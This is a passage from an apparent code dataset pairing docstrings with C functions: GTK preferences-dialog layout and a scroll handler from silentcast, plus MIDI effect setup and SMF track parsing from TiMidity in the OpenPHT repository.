gtk_widget_set_halign (out_label, GTK_ALIGN_START);\n  GtkWidget *dir_label = gtk_label_new (\"Working Directory\"); gtk_widget_set_halign (dir_label, GTK_ALIGN_END);\n  \n#define CONFIG_ATTACH(A,C,R,W) gtk_grid_attach (GTK_GRID(config), A, C, R, W, 1) \n                                                \n  CONFIG_ATTACH(gtk_label_new (\"        \"), 0, 0, 1);                                                        CONFIG_ATTACH(save_config, 8, 0, 1); \n                   CONFIG_ATTACH(out_label, 1, 1, 2);                                                                                 \n                CONFIG_ATTACH(gif_checkbox, 1, 2, 1);\n                CONFIG_ATTACH(png_checkbox, 1, 3, 1);\n               CONFIG_ATTACH(webm_checkbox, 1, 4, 1);       CONFIG_ATTACH(fps_label, 2, 4, 1);    CONFIG_ATTACH(fps_spin_button, 3, 4, 1); \n                CONFIG_ATTACH(mp4_checkbox, 1, 5, 1);      CONFIG_ATTACH(from_label, 2, 5, 1); CONFIG_ATTACH(from_mkv_combobutt, 3, 5, 1);         \n                   CONFIG_ATTACH(dir_label, 1, 6, 1);CONFIG_ATTACH(view_w_dir_entry, 2, 6, 5);       CONFIG_ATTACH(change_w_dir, 7, 6, 1);  \n\n  /* Preferences tab layout */\n  GtkWidget *sel_area_label = gtk_label_new (NULL);\n  gtk_label_set_markup (GTK_LABEL(sel_area_label), BGN_SCTN\"What area should the rectangle surround on startup?\"END_SCTN);\n  gtk_widget_set_halign (sel_area_label, GTK_ALIGN_START);\n#define PRFS_ATCH(A,C,R,W) gtk_grid_attach (GTK_GRID(prefs), A, C, R, W, 1) \n  PRFS_ATCH(gtk_label_new (\"        \"), 0, 0, 1);                                           PRFS_ATCH(save_prefs, 6, 0, 1);  \n  PRFS_ATCH(sel_area_label, 1, 1, 4);\n  PRFS_ATCH(active_win_radiobutt, 2, 2, 2);   PRFS_ATCH(extents_checkbox, 4, 2, 1);\n  PRFS_ATCH(center_radiobutt, 2, 3, 3);\n  PRFS_ATCH(previous_radiobutt, 2, 4, 3);\n\n  GtkWidget *edit_presets_label = gtk_label_new (NULL);\n  gtk_label_set_markup (GTK_LABEL(edit_presets_label), BGN_SCTN\"What preset sizes should be used with the scroll wheel and middle drag?\"END_SCTN);\n  gtk_widget_set_halign (edit_presets_label, GTK_ALIGN_START);\n  GtkWidget *w1_label = gtk_label_new (\"Width\"); gtk_widget_set_halign (w1_label, GTK_ALIGN_START);\n  GtkWidget *w2_label = gtk_label_new (\"Width\"); gtk_widget_set_halign (w2_label, GTK_ALIGN_START);\n  GtkWidget *h1_label = gtk_label_new (\"Height\"); gtk_widget_set_halign (h1_label, GTK_ALIGN_START);\n  GtkWidget *h2_label = gtk_label_new (\"Height\"); gtk_widget_set_halign (h2_label, GTK_ALIGN_START);\n\n  PRFS_ATCH(gtk_label_new (\" \"), 1, 5, 1); //blank row before Edit preset sizes\n  PRFS_ATCH(edit_presets_label, 1, 6, 5);\n  //verical separator at column 3\n  gtk_grid_attach (GTK_GRID(prefs), gtk_separator_new (GTK_ORIENTATION_VERTICAL), 3, 7, 1, 9);\n       PRFS_ATCH(w1_label,1,7 ,1);     PRFS_ATCH(h1_label,2,7 ,1);      PRFS_ATCH(w2_label,4,7 ,1);      PRFS_ATCH(h2_label,5,7 ,1);\n  PRFS_ATCH(w_spinbutt[0],1,8 ,1);PRFS_ATCH(h_spinbutt[0],2,8 ,1);PRFS_ATCH(w_spinbutt[8 ],4,8 ,1);PRFS_ATCH(h_spinbutt[8 ],5,8 ,1);  \n  PRFS_ATCH(w_spinbutt[1],1,9 ,1);PRFS_ATCH(h_spinbutt[1],2,9 ,1);PRFS_ATCH(w_spinbutt[9 ],4,9 ,1);PRFS_ATCH(h_spinbutt[9 ],5,9 ,1);  \n  PRFS_ATCH(w_spinbutt[2],1,10,1);PRFS_ATCH(h_spinbutt[2],2,10,1);PRFS_ATCH(w_spinbutt[10],4,10,1);PRFS_ATCH(h_spinbutt[10],5,10,1);  \n  PRFS_ATCH(w_spinbutt[3],1,11,1);PRFS_ATCH(h_spinbutt[3],2,11,1);PRFS_ATCH(w_spinbutt[11],4,11,1);PRFS_ATCH(h_spinbutt[11],5,11,1);  \n  PRFS_ATCH(w_spinbutt[4],1,12,1);PRFS_ATCH(h_spinbutt[4],2,12,1);PRFS_ATCH(w_spinbutt[12],4,12,1);PRFS_ATCH(h_spinbutt[12],5,12,1);  \n  PRFS_ATCH(w_spinbutt[5],1,13,1);PRFS_ATCH(h_spinbutt[5],2,13,1);PRFS_ATCH(w_spinbutt[13],4,13,1);PRFS_ATCH(h_spinbutt[13],5,13,1);  \n  PRFS_ATCH(w_spinbutt[6],1,14,1);PRFS_ATCH(h_spinbutt[6],2,14,1);PRFS_ATCH(w_spinbutt[14],4,14,1);PRFS_ATCH(h_spinbutt[14],5,14,1);  \n  PRFS_ATCH(w_spinbutt[7],1,15,1);PRFS_ATCH(h_spinbutt[7],2,15,1);PRFS_ATCH(w_spinbutt[15],4,15,1);PRFS_ATCH(h_spinbutt[15],5,15,1);  \n  PRFS_ATCH(gtk_label_new (\" \"),1,16,1); //blank row at bottom\n  \n  gtk_widget_show_all(f1_widget);\n  update_area_prefs (widget, f1_widget); //have to do this after show_all or else get error that extents_checkbox \n                                         //isn't a widget when set sensitive TRUE or FALSE\n}", "path": "silentcast/src/SC_conf_widgets.c", "commit_date": "2017-10-27 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/* Handle scroll events (wheel on mouse)\n * by increasing or decreasing the size of the rectangle\n * to the next preset size \n */\n", "func_signal": "static gboolean scroll_event_cb (GtkWidget       *widget,\n                                 GdkEventScroll  *event,\n                                 gpointer         data)", "code": "{\n  cairo_surface_t *surface = P(\"surface\");\n  GdkRectangle *p_area_rect = P (\"p_area_rect\");\n  double *presets = P(\"presets\");\n\n  /* paranoia check, in case we haven't gotten a configure event */\n  if (surface == NULL) return FALSE;\n\n  scroll_resize_to_preset (event->direction, p_area_rect, presets);\n  draw_rect (widget, p_area_rect, surface);\n\n  /* The event is handled, stop processing */\n  return TRUE;\n}", "path": "silentcast/src/main.c", "commit_date": "2017-10-28 00:00:00", "repo_name": "colinkeenan/silentcast", "stars": 512, "license": "gpl-3.0", "language": "c", "size": 41078}
{"docstring": "/*! re-allocate GS insertion effect parameters. */\n", "func_signal": "void realloc_insertion_effect_gs(void)", "code": "{\n\tstruct insertion_effect_gs_t *st = &insertion_effect_gs;\n\tint type_msb = st->type_msb, type_lsb = st->type_lsb;\n\n\tfree_effect_list(st->ef);\n\tst->ef = NULL;\n\n\tswitch(type_msb) {\n\tcase 0x01:\n\t\tswitch(type_lsb) {\n\t\tcase 0x00: /* Stereo-EQ */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_STEREO_EQ);\n\t\t\tbreak;\n\t\tcase 0x10: /* Overdrive */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_EQ2);\n\t\t\tst->ef = push_effect(st->ef, EFFECT_OVERDRIVE1);\n\t\t\tbreak;\n\t\tcase 0x11: /* Distortion */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_EQ2);\n\t\t\tst->ef = push_effect(st->ef, EFFECT_DISTORTION1);\n\t\t\tbreak;\n\t\tcase 0x40: /* Hexa Chorus */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_EQ2);\n\t\t\tst->ef = push_effect(st->ef, EFFECT_HEXA_CHORUS);\n\t\t\tbreak;\n\t\tcase 0x72: /* Lo-Fi 1 */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_EQ2);\n\t\t\tst->ef = push_effect(st->ef, EFFECT_LOFI1);\n\t\t\tbreak;\n\t\tcase 0x73: /* Lo-Fi 2 */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_EQ2);\n\t\t\tst->ef = push_effect(st->ef, EFFECT_LOFI2);\n\t\t\tbreak;\n\t\tdefault: break;\n\t\t}\n\t\tbreak;\n\tcase 0x11:\n\t\tswitch(type_lsb) {\n\t\tcase 0x03: /* OD1 / OD2 */\n\t\t\tst->ef = push_effect(st->ef, EFFECT_OD1OD2);\n\t\t\tbreak;\n\t\tdefault: break;\n\t\t}\n\t\tbreak;\n\tdefault: break;\n\t}\n\n\tset_effect_param_gs(st, type_msb, type_lsb);\n\n\trecompute_insertion_effect_gs();\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute GS user instrument. */\n", "func_signal": "void recompute_userinst(int bank, int prog)", "code": "{\n\tUserInstrument *p;\n\n\tp = get_userinst(bank, prog);\n\n\tfree_tone_bank_element(&tonebank[bank]->tone[prog]);\n\tif(tonebank[p->source_bank]) {\n\t\tif(tonebank[p->source_bank]->tone[p->source_prog].name) {\n\t\t\tcopy_tone_bank_element(&tonebank[bank]->tone[prog], &tonebank[p->source_bank]->tone[p->source_prog]);\n\t\t\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"User Instrument (%d %d -> %d %d)\", p->source_bank, p->source_prog, bank, prog);\n\t\t} else if(tonebank[0]->tone[p->source_prog].name) {\n\t\t\tcopy_tone_bank_element(&tonebank[bank]->tone[prog], &tonebank[0]->tone[p->source_prog]);\n\t\t\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"User Instrument (%d %d -> %d %d)\", 0, p->source_prog, bank, prog);\n\t\t}\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute Delay Effect (GS) */\n", "func_signal": "void recompute_delay_status_gs(void)", "code": "{\n\tstruct delay_status_gs_t *p = &delay_status_gs;\n\tp->time_center = delay_time_center_table[p->time_c > 0x73 ? 0x73 : p->time_c];\n\tp->time_ratio_left = (double)p->time_l / 24;\n\tp->time_ratio_right = (double)p->time_r / 24;\n\tp->sample_c = p->time_center * play_mode->rate / 1000.0f;\n\tp->sample_l = p->sample_c * p->time_ratio_left;\n\tp->sample_r = p->sample_c * p->time_ratio_right;\n\tp->level_ratio_c = (double)p->level * (double)p->level_center / (127.0f * 127.0f);\n\tp->level_ratio_l = (double)p->level * (double)p->level_left / (127.0f * 127.0f);\n\tp->level_ratio_r = (double)p->level * (double)p->level_right / (127.0f * 127.0f);\n\tp->feedback_ratio = (double)(p->feedback - 64) * (0.763f * 2.0f / 100.0f);\n\tp->send_reverb_ratio = (double)p->send_reverb * (0.787f / 100.0f);\n\n\tif(p->level_left != 0 || (p->level_right != 0 && p->type == 0)) {\n\t\tp->type = 1;\t/* it needs 3-tap delay effect. */\n\t}\n\n\tif(p->pre_lpf) {\n\t\tp->lpf.a = 2.0 * ((double)(7 - p->pre_lpf) / 7.0f * 16000.0f + 200.0f) / play_mode->rate;\n\t\tinit_filter_lowpass1(&(p->lpf));\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/* Map XG types onto GS types.  XG should eventually have its own tables */\n", "func_signal": "static int set_xg_chorus_type(int msb, int lsb)", "code": "{\n\tint type = 2;\n\n\tif ((msb >= 0x00 && msb <= 0x40) ||\n\t    (msb >= 0x45 && msb <= 0x47) ||\n\t    (msb >= 0x49))\t\t\t/* NO EFFECT */\n\t{\n\t\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"XG Set Chorus Type (NO EFFECT %d %d)\", msb, lsb);\n\t\treturn -1;\n\t}\n\n\tswitch(msb)\n\t{\n\t    case 0x41:\n\t\ttype = 0;\t\t\t/* Chorus 1 */\n\t\tbreak;\n\t    case 0x42:\n\t\ttype = 0;\t\t\t/* Celeste 1 -> Chorus 1 */\n\t\tbreak;\n\t    case 0x43:\n\t\ttype = 5;\n\t\tbreak;\n\t    default:\n\t\ttype = 2;\t\t\t/* unsupported -> Chorus 3 */\n\t    break;\n\t}\n\tif (lsb == 0x01)\n\t{\n\t    switch(msb)\n\t    {\n\t\tcase 0x41:\n\t\t    type = 1;\t\t\t/* Chorus 2 */\n\t\t    break;\n\t\tcase 0x42:\n\t\t    type = 1;\t\t\t/* Celeste 2 -> Chorus 2 */\n\t\t    break;\n\t\tdefault:\n\t\t    break;\n\t    }\n\t}\n\telse if (lsb == 0x02)\n\t{\n\t    switch(msb)\n\t    {\n\t\tcase 0x41:\n\t\t    type = 2;\t\t\t/* Chorus 3 */\n\t\t    break;\n\t\tcase 0x42:\n\t\t    type = 2;\t\t\t/* Celeste 3 -> Chorus 3 */\n\t\t    break;\n\t\tdefault:\n\t\t    break;\n\t    }\n\t}\n\telse if (lsb == 0x08)\n\t{\n\t    switch(msb)\n\t    {\n\t\tcase 0x41:\n\t\t    type = 3;\t\t\t/* Chorus 4 */\n\t\t    break;\n\t\tcase 0x42:\n\t\t    type = 3;\t\t\t/* Celeste 4 -> Chorus 4 */\n\t\t    break;\n\t\tdefault:\n\t\t    break;\n\t    }\n\t}\n\n\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"XG Set Chorus Type (%d)\", type);\n\treturn type;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! initialize GS user drumset. */\n", "func_signal": "void init_userdrum()", "code": "{\n\tint i;\n\tAlternateAssign *alt;\n\n\tfree_userdrum();\n\n\tfor(i=0;i<2;i++) {\t/* allocate alternative assign */\n\t\talt = (AlternateAssign *)safe_malloc(sizeof(AlternateAssign));\n\t\tmemset(alt, 0, sizeof(AlternateAssign));\n\t\talloc_instrument_bank(1, 64 + i);\n\t\tdrumset[64 + i]->alt = alt;\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! initialize XG effect parameters */\n", "func_signal": "static void init_all_effect_xg(void)", "code": "{\n\tint i;\n \tinit_effect_xg(&reverb_status_xg);\n\treverb_status_xg.type_msb = 0x01;\n\treverb_status_xg.connection = XG_CONN_SYSTEM_REVERB;\n\trealloc_effect_xg(&reverb_status_xg);\n\tinit_effect_xg(&chorus_status_xg);\n\tchorus_status_xg.type_msb = 0x41;\n\tchorus_status_xg.connection = XG_CONN_SYSTEM_CHORUS;\n\trealloc_effect_xg(&chorus_status_xg);\n\tfor (i = 0; i < XG_VARIATION_EFFECT_NUM; i++) {\n\t\tinit_effect_xg(&variation_effect_xg[i]);\n\t\tvariation_effect_xg[i].type_msb = 0x05;\n\t\trealloc_effect_xg(&variation_effect_xg[i]);\n\t}\n\tfor (i = 0; i < XG_INSERTION_EFFECT_NUM; i++) {\n\t\tinit_effect_xg(&insertion_effect_xg[i]);\n\t\tinsertion_effect_xg[i].type_msb = 0x49;\n\t\trealloc_effect_xg(&insertion_effect_xg[i]);\n\t}\n\tinit_ch_effect_xg();\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/* Read a SMF track */\n", "func_signal": "static int read_smf_track(struct timidity_file *tf, int trackno, int rewindp)", "code": "{\n    int32 len, next_pos, pos;\n    char tmp[4];\n    int lastchan, laststatus;\n    int me, type, a, b, c;\n    int i;\n    int32 smf_at_time;\n\n    smf_at_time = readmidi_set_track(trackno, rewindp);\n\n    /* Check the formalities */\n    if((tf_read(tmp, 1, 4, tf) != 4) || (tf_read(&len, 4, 1, tf) != 1))\n    {\n\tctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t  \"%s: Can't read track header.\", current_filename);\n\treturn -1;\n    }\n    len = BE_LONG(len);\n    next_pos = tf_tell(tf) + len;\n    if(strncmp(tmp, \"MTrk\", 4))\n    {\n\tctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t  \"%s: Corrupt MIDI file.\", current_filename);\n\treturn -2;\n    }\n\n    lastchan = laststatus = 0;\n\n    for(;;)\n    {\n\tif(readmidi_error_flag)\n\t    return -1;\n\tif((len = getvl(tf)) < 0)\n\t    return -1;\n\tsmf_at_time += len;\n\terrno = 0;\n\tif((i = tf_getc(tf)) == EOF)\n\t{\n\t    if(errno)\n\t\tctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t\t  \"%s: read_midi_event: %s\",\n\t\t\t  current_filename, strerror(errno));\n\t    else\n\t\tctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t\t  \"Warning: %s: Too shorten midi file.\",\n\t\t\t  current_filename);\n\t    return -1;\n\t}\n\n\tme = (uint8)i;\n\tif(me == 0xF0 || me == 0xF7) /* SysEx event */\n\t{\n\t    if((len = getvl(tf)) < 0)\n\t\treturn -1;\n\t    if((i = read_sysex_event(smf_at_time, me, len, tf)) != 0)\n\t\treturn i;\n\t}\n\telse if(me == 0xFF) /* Meta event */\n\t{\n\t    type = tf_getc(tf);\n\t    if((len = getvl(tf)) < 0)\n\t\treturn -1;\n\t    if(type > 0 && type < 16)\n\t    {\n\t\tstatic char *label[] =\n\t\t{\n\t\t    \"Text event: \", \"Text: \", \"Copyright: \", \"Track name: \",\n\t\t    \"Instrument: \", \"Lyric: \", \"Marker: \", \"Cue point: \"\n\t\t};\n\n\t\tif(type == 5 || /* Lyric */\n\t\t   (type == 1 && (opt_trace_text_meta_event ||\n\t\t\t\t  karaoke_format == 2 ||\n\t\t\t\t  chorus_status_gs.text.status == CHORUS_ST_OK)) ||\n\t\t   (type == 6 &&  (current_file_info->format == 0 ||\n\t\t\t\t   (current_file_info->format == 1 &&\n\t\t\t\t    current_read_track == 0))))\n\t\t{\n\t\t    char *str, *text;\n\t\t    MidiEvent ev;\n\n\t\t    str = (char *)new_segment(&tmpbuffer, len + 3);\n\t\t    if(type != 6)\n\t\t    {\n\t\t\ti = tf_read(str, 1, len, tf);\n\t\t\tstr[len] = '\\0';\n\t\t    }\n\t\t    else\n\t\t    {\n\t\t\ti = tf_read(str + 1, 1, len, tf);\n\t\t\tstr[0] = MARKER_START_CHAR;\n\t\t\tstr[len + 1] = MARKER_END_CHAR;\n\t\t\tstr[len + 2] = '\\0';\n\t\t    }\n\n\t\t    if(i != len)\n\t\t    {\n\t\t\tctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t\t\t  \"Warning: %s: Too shorten midi file.\",\n\t\t\t\t  current_filename);\n\t\t\treuse_mblock(&tmpbuffer);\n\t\t\treturn -1;\n\t\t    }\n\n\t\t    if((text = readmidi_make_string_event(1, str, &ev, 1))\n\t\t       == NULL)\n\t\t    {\n\t\t\treuse_mblock(&tmpbuffer);\n\t\t\tcontinue;\n\t\t    }\n\t\t    ev.time = smf_at_time;\n\n\t\t    if(type == 6)\n\t\t    {\n\t\t\tif(strlen(fix_string(text + 1)) == 2)\n\t\t\t{\n\t\t\t    reuse_mblock(&tmpbuffer);\n\t\t\t    continue; /* Empty Marker */\n\t\t\t}\n\t\t    }\n\n\t\t    switch(type)\n\t\t    {\n\t\t      case 1:\n\t\t\tif(karaoke_format == 2)\n\t\t\t{\n\t\t\t    *text = ME_KARAOKE_LYRIC;\n\t\t\t    if(karaoke_title_flag == 0 &&\n\t\t\t       strncmp(str, \"@T\", 2) == 0)\n\t\t\t\tcurrent_file_info->karaoke_title =\n\t\t\t\t    add_karaoke_title(current_file_info->\n\t\t\t\t\t\t      karaoke_title, str + 2);\n\t\t\t    ev.type = ME_KARAOKE_LYRIC;\n\t\t\t    readmidi_add_event(&ev);\n\t\t\t    continue;\n\t\t\t}\n\t\t\tif(chorus_status_gs.text.status == CHORUS_ST_OK)\n\t\t\t{\n\t\t\t    *text = ME_CHORUS_TEXT;\n\t\t\t    ev.type = ME_CHORUS_TEXT;\n\t\t\t    readmidi_add_event(&ev);\n\t\t\t    continue;\n\t\t\t}\n\t\t\t*text = ME_TEXT;\n\t\t\tev.type = ME_TEXT;\n\t\t\treadmidi_add_event(&ev);\n\t\t\tcontinue;\n\t\t      case 5:\n\t\t\t*text = ME_LYRIC;\n\t\t\tev.type = ME_LYRIC;\n\t\t\treadmidi_add_event(&ev);\n\t\t\tcontinue;\n\t\t      case 6:\n\t\t\t*text = ME_MARKER;\n\t\t\tev.type = ME_MARKER;\n\t\t\treadmidi_add_event(&ev);\n\t\t\tcontinue;\n\t\t    }\n\t\t}\n\n\t\tif(type == 3 && /* Sequence or Track Name */\n\t\t   (current_file_info->format == 0 ||\n\t\t    (current_file_info->format == 1 &&\n\t\t     current_read_track == 0)))\n\t\t{\n\t\t  if(current_file_info->seq_name == NULL) {\n\t\t    char *name = dumpstring(3, len, \"Sequence: \", 1, tf);\n\t\t    current_file_info->seq_name = safe_strdup(fix_string(name));\n\t\t    free(name);\n\t\t  }\n\t\t    else\n\t\t\tdumpstring(3, len, \"Sequence: \", 0, tf);\n\t\t}\n\t\telse if(type == 1 &&\n\t\t\tcurrent_file_info->first_text == NULL &&\n\t\t\t(current_file_info->format == 0 ||\n\t\t\t (current_file_info->format == 1 &&\n\t\t\t  current_read_track == 0))) {\n\t\t  char *name = dumpstring(1, len, \"Text: \", 1, tf);\n\t\t  current_file_info->first_text = safe_strdup(fix_string(name));\n\t\t  free(name);\n\t\t}\n\t\telse\n\t\t    dumpstring(type, len, label[(type>7) ? 0 : type], 0, tf);\n\t    }\n\t    else\n\t    {\n\t\tswitch(type)\n\t\t{\n\t\t  case 0x00:\n\t\t    if(len == 2)\n\t\t    {\n\t\t\ta = tf_getc(tf);\n\t\t\tb = tf_getc(tf);\n\t\t\tctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t\t  \"(Sequence Number %02x %02x)\", a, b);\n\t\t    }\n\t\t    else\n\t\t\tctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t\t  \"(Sequence Number len=%d)\", len);\n\t\t    break;\n\n\t\t  case 0x2F: /* End of Track */\n\t\t    pos = tf_tell(tf);\n\t\t    if(pos < next_pos)\n\t\t\ttf_seek(tf, next_pos - pos, SEEK_CUR);\n\t\t    return 0;\n\n\t\t  case 0x51: /* Tempo */\n\t\t    a = tf_getc(tf);\n\t\t    b = tf_getc(tf);\n\t\t    c = tf_getc(tf);\n\t\t    MIDIEVENT(smf_at_time, ME_TEMPO, c, a, b);\n\t\t    break;\n\n\t\t  case 0x54:\n\t\t    /* SMPTE Offset (hr mn se fr ff)\n\t\t     * hr: hours&type\n\t\t     *     0     1     2     3    4    5    6    7   bits\n\t\t     *     0  |<--type -->|<---- hours [0..23]---->|\n\t\t     * type: 00: 24 frames/second\n\t\t     *       01: 25 frames/second\n\t\t     *       10: 30 frames/second (drop frame)\n\t\t     *       11: 30 frames/second (non-drop frame)\n\t\t     * mn: minis [0..59]\n\t\t     * se: seconds [0..59]\n\t\t     * fr: frames [0..29]\n\t\t     * ff: fractional frames [0..99]\n\t\t     */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(SMPTE Offset meta event)\");\n\t\t    skip(tf, len);\n\t\t    break;\n\n\t\t  case 0x58: /* Time Signature */\n\t\t    smf_time_signature(smf_at_time, tf, len);\n\t\t    break;\n\n\t\t  case 0x59: /* Key Signature */\n\t\t    smf_key_signature(smf_at_time, tf, len);\n\t\t    break;\n\n\t\t  case 0x7f: /* Sequencer-Specific Meta-Event */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sequencer-Specific meta event, length %ld)\",\n\t\t\t      len);\n\t\t    skip(tf, len);\n\t\t    break;\n\n\t\t  case 0x20: /* MIDI channel prefix (SMF v1.0) */\n\t\t    if(len == 1)\n\t\t    {\n\t\t\tint midi_channel_prefix = tf_getc(tf);\n\t\t\tctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t\t  \"(MIDI channel prefix %d)\",\n\t\t\t\t  midi_channel_prefix);\n\t\t    }\n\t\t    else\n\t\t\tskip(tf, len);\n\t\t    break;\n\n\t\t  case 0x21: /* MIDI port number */\n\t\t    if(len == 1)\n\t\t    {\n\t\t\tif((midi_port_number = tf_getc(tf))\n\t\t\t   == EOF)\n\t\t\t{\n\t\t\t    ctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t\t\t      \"Warning: %s: Too shorten midi file.\",\n\t\t\t\t      current_filename);\n\t\t\t    return -1;\n\t\t\t}\n\t\t\tmidi_port_number &= 0xF;\n\t\t\tctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t\t  \"(MIDI port number %d)\", midi_port_number);\n\t\t    }\n\t\t    else\n\t\t\tskip(tf, len);\n\t\t    break;\n\n\t\t  default:\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Meta event type 0x%02x, length %ld)\",\n\t\t\t      type, len);\n\t\t    skip(tf, len);\n\t\t    break;\n\t\t}\n\t    }\n\t}\n\telse /* MIDI event */\n\t{\n\t    a = me;\n\t    if(a & 0x80) /* status byte */\n\t    {\n\t\tlastchan = MERGE_CHANNEL_PORT(a & 0x0F);\n\t\tlaststatus = (a >> 4) & 0x07;\n\t\tif(laststatus != 7)\n\t\t    a = tf_getc(tf) & 0x7F;\n\t    }\n\t    switch(laststatus)\n\t    {\n\t      case 0: /* Note off */\n\t\tb = tf_getc(tf) & 0x7F;\n\t\tMIDIEVENT(smf_at_time, ME_NOTEOFF, lastchan, a,b);\n\t\tbreak;\n\n\t      case 1: /* Note on */\n\t\tb = tf_getc(tf) & 0x7F;\n\t\tif(b)\n\t\t{\n\t\t    MIDIEVENT(smf_at_time, ME_NOTEON, lastchan, a,b);\n\t\t}\n\t\telse /* b == 0 means Note Off */\n\t\t{\n\t\t    MIDIEVENT(smf_at_time, ME_NOTEOFF, lastchan, a, 0);\n\t\t}\n\t\tbreak;\n\n\t      case 2: /* Key Pressure */\n\t\tb = tf_getc(tf) & 0x7F;\n\t\tMIDIEVENT(smf_at_time, ME_KEYPRESSURE, lastchan, a, b);\n\t\tbreak;\n\n\t      case 3: /* Control change */\n\t\tb = tf_getc(tf);\n\t\treadmidi_add_ctl_event(smf_at_time, lastchan, a, b);\n\t\tbreak;\n\n\t      case 4: /* Program change */\n\t\tMIDIEVENT(smf_at_time, ME_PROGRAM, lastchan, a, 0);\n\t\tbreak;\n\n\t      case 5: /* Channel pressure */\n\t\tMIDIEVENT(smf_at_time, ME_CHANNEL_PRESSURE, lastchan, a, 0);\n\t\tbreak;\n\n\t      case 6: /* Pitch wheel */\n\t\tb = tf_getc(tf) & 0x7F;\n\t\tMIDIEVENT(smf_at_time, ME_PITCHWHEEL, lastchan, a, b);\n\t\tbreak;\n\n\t      default: /* case 7: */\n\t\t/* Ignore this event */\n\t\tswitch(lastchan & 0xF)\n\t\t{\n\t\t  case 2: /* Sys Com Song Position Pntr */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys Com Song Position Pntr)\");\n\t\t    tf_getc(tf);\n\t\t    tf_getc(tf);\n\t\t    break;\n\n\t\t  case 3: /* Sys Com Song Select(Song #) */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys Com Song Select(Song #))\");\n\t\t    tf_getc(tf);\n\t\t    break;\n\n\t\t  case 6: /* Sys Com tune request */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys Com tune request)\");\n\t\t    break;\n\t\t  case 8: /* Sys real time timing clock */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys real time timing clock)\");\n\t\t    break;\n\t\t  case 10: /* Sys real time start */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys real time start)\");\n\t\t    break;\n\t\t  case 11: /* Sys real time continue */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys real time continue)\");\n\t\t    break;\n\t\t  case 12: /* Sys real time stop */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys real time stop)\");\n\t\t    break;\n\t\t  case 14: /* Sys real time active sensing */\n\t\t    ctl->cmsg(CMSG_INFO, VERB_DEBUG,\n\t\t\t      \"(Sys real time active sensing)\");\n\t\t    break;\n#if 0\n\t\t  case 15: /* Meta */\n\t\t  case 0: /* SysEx */\n\t\t  case 7: /* SysEx */\n#endif\n\t\t  default: /* 1, 4, 5, 9, 13 */\n\t\t    ctl->cmsg(CMSG_ERROR, VERB_NORMAL,\n\t\t\t      \"*** Can't happen: status 0x%02X channel 0x%02X\",\n\t\t\t      laststatus, lastchan & 0xF);\n\t\t    break;\n\t\t}\n\t\t}\n\t}\n    }\n    /*NOTREACHED*/\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
